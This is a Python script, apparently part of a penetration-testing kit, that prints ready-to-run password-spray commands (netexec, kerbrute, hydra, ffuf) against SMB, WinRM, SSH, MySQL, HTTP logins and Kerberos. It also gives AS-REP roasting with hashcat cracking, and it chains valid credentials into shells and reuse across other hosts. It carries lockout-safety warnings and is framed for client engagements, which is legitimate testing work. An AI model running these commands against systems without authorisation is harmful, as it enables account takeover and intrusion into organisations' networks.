#!/usr/bin/env python3
"""PASSWORD SPRAY / credential access (Bucket B). Drives netexec/kerbrute/hydra. PRINTS commands.

!!! LOCKOUT SAFETY — the #1 way to damage a client relationship !!!
  - SPRAY, don't brute: ONE password across MANY users per window — NOT many passwords per user.
  - Read the lockout policy FIRST: `nxc smb <dc> -u <user> -p <pass> --pass-pol` (default AD = 5 tries / 30 min).
  - Stay UNDER the threshold: e.g. 1 attempt/user, then wait the observation window before the next password.
  - Found creds first (reuse before guessing). Skip disabled/lockout-prone accounts. Log attempts/user.

Usage:
  python3 gen_spray.py --proto smb --users users.txt --password 'Winter2025!' --target 10.0.0.5
  python3 gen_spray.py --proto smb --users users.txt --passwords passlist.txt --target 10.0.0.5 --delay 1800
  proto: smb | winrm | ssh | rdp | mssql | ldap | ftp | http-get | http-post | kerberos | mysql
"""
import sys
import _network_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

proto  = opt("--proto", "smb")
users  = opt("--users", P.USERLIST)
pw     = opt("--password")
pws    = opt("--passwords")
tgt    = opt("--target", "<target>")
delay  = opt("--delay", "0")
dom    = opt("--domain", P.DOMAIN)
PSPEC  = f"-p '{pw}'" if pw else (f"-p {pws}" if pws else "-p '<password>'")

print(f"# PASSWORD SPRAY  proto={proto}  target={tgt}")
print(f"# needs: a candidate USER LIST (--users, <x>=one user per line) + a password to try (--password '<password>').")
print(f"# 0) READ THE LOCKOUT POLICY FIRST (do not skip):")
print(f"#    nxc smb {tgt} -u <known-user> -p <known-pass> --pass-pol   # threshold + observation window")
print(f"#    -> ok: prints the lockout threshold + window; stay UNDER it (1 try/user, then wait).")
print(f"#    then spray 1 password/user, wait the window ({delay}s set) before the next password.\n")

nxc = {
    "smb":   f"nxc smb {tgt} -u {users} {PSPEC} --continue-on-success",
    "winrm": f"nxc winrm {tgt} -u {users} {PSPEC} --continue-on-success",
    "ssh":   f"nxc ssh {tgt} -u {users} {PSPEC} --continue-on-success",
    "rdp":   f"nxc rdp {tgt} -u {users} {PSPEC} --continue-on-success",
    "mssql": f"nxc mssql {tgt} -u {users} {PSPEC} --continue-on-success" + ("  --local-auth" if not dom else ""),
    "ldap":  f"nxc ldap {tgt} -u {users} {PSPEC} --continue-on-success",
    "ftp":   f"nxc ftp {tgt} -u {users} {PSPEC} --continue-on-success",
}
if proto in nxc:
    d = f"  -d {dom}" if dom and proto in ("smb", "winrm", "mssql", "ldap") else ""
    print(f"# 1) spray (netexec — a valid hit prints [+]):")
    print(nxc[proto] + d)
    print(f"#    -> ok: a valid credential prints a green [+] user:pass; (Pwn3d!) on that line = admin on the host.")
    if proto == "smb":
        print(f"#    add --local-auth for LOCAL accounts; drop -d for workgroup. Verify admin: a hit shows (Pwn3d!).")
elif proto == "mysql":
    # hydra, NOT netexec — nxc has no mysql module, so the [+]/(Pwn3d!) oracle does NOT apply here.
    # hydra uses -p for ONE password and -P for a password FILE (nxc takes either after -p).
    hspec = f"-p '{pw}'" if pw else (f"-P {pws}" if pws else "-p '<password>'")
    print(f"# MySQL spray (hydra — netexec has no mysql module):")
    print(f"hydra -L {users} {hspec} {tgt} mysql")
    print(f"#    -> ok: hydra prints '[3306][mysql] host: {tgt}  login: <u>  password: <p>' for a valid pair.")
    print(f"#    (there is NO [+]/(Pwn3d!) line here — that oracle is netexec-only.)")
elif proto == "http-get":
    print(f"# HTTP Basic-auth spray:")
    print(f"hydra -L {users} -p '<password>' {tgt} http-get '/protected/'")
    print(f"#    -> ok: hydra prints '[80][http-get] host: ... login: <u> password: <p>' for a valid pair.")
elif proto == "http-post":
    print(f"# needs: capture the login POST body + the FAILURE string from the login page first (browser/Burp).")
    print(f"# HTTP form spray (fill in the real path, field names, and failure text — <x> below):")
    print(f"hydra -L {users} -p '<password>' {tgt} http-post-form "
          f"'/login:user=^USER^&pass=^PASS^:F=Invalid'")
    print(f"#    or:  ffuf -w {users}:U -u http://{tgt}/login -X POST -d 'user=U&pass=<pw>' -mc 200 -fr 'Invalid'")
    print(f"#    -> ok: a login NOT matching the 'Invalid' failure string = a valid credential.")
elif proto == "kerberos":
    print(f"# needs: a reachable Domain Controller (--dc {tgt}) + the AD domain (--domain).")
    print(f"# Kerberos pre-auth spray (try first — NO lockout increment on some setups, but still throttle):")
    print(f"kerbrute passwordspray -d {dom or '<domain>'} --dc {tgt} {users} '<password>'")
    print(f"#    -> ok: kerbrute prints '[+] VALID LOGIN: user@domain:<password>'.")
    print(f"# AS-REP roast (no password needed) for preauth-disabled users:")
    print(f"GetNPUsers.py {dom or '<dom>'}/ -dc-ip {tgt} -usersfile {users} -no-pass -format hashcat -outputfile asrep.hash")
    print(f"#    -> ok: a $krb5asrep$ hash is written to asrep.hash. then: hashcat -m 18200 asrep.hash rockyou.txt")
else:
    print(f"# unknown proto '{proto}' — use: smb|winrm|ssh|rdp|mssql|ldap|ftp|http-get|http-post|kerberos|mysql")
    sys.exit(1)

print(f"\n# 2) a valid credential [+] -> turn it into a shell:")
print(f"#    python3 gen_shell.py --target {tgt} --user <user> --pass '<pass>' --proto {proto if proto in ('smb','winrm','ssh','mssql','rdp') else 'smb'}")
print(f"# 3) reuse the cred everywhere (password reuse is a finding): spray it across other hosts/services.")
print(f"\n# SAFETY: if you see accounts locking, STOP. Report attempts-per-user. Never run an unbounded --passwords loop against AD.")
